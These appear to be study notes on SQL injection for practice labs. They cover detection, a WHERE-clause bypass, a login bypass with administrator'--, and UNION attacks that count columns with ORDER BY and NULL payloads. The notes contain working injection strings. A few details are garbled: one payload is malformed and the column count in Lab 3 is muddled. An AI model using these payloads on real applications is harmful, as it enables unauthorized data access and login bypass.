# WHAT is SQL Injection
- Vulnerability that allows an attacker to interfere with the queries that an application makes to its database
- Get,modify,delete Data, and sometimes DoS

# Detect SQL Vulnerabilitty
- The single quote character **'** and look for errors or other anomalies.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.

- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

# **LAB 1** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- Normal `/filter?category=Gifts`
- Modified `/filter?category=Gifts'+OR+1=1--`
- Payload `'OR=+1=1--`
- Original query `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

# **LAB 2  SQL injection vulnerability allowing login bypass**
- Original Query `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
- Payload `administrator'--` , comment password check

# UNION Attacks
- The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query
- `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
- For a UNION query to work, two key requirements must be met:
      - _**The individual queries must return the same number of columns.**_
      - _**The data types in each column must be compatible between the individual queries.**_

### Determining the number of columns required 
- One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
... Until Error, sometimes there are not any response to front-end
```

- The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
# **LAB 3 SQL injection UNION attack, determining the number of columns returned by the query**
- Original Query : `/filter?category=Pets`
- Payload : `/filter?category=Pets'UNION+SELECT+NULL,NULL,NULL--` add NULL until get an error, we get error 4 NULL, this mean there are 3 value
